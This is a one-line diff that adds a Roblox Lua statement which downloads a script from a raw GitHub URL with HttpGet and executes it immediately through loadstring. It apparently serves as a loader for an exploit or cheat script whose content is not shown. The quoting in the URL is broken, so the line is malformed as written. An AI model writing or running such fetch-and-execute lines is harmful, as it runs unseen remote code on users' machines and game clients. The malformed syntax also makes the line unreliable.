@@ -1,0 +1,1 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/Pio092707/Pio-Dont-leak/main/Pag%20leak%20delete%22)()
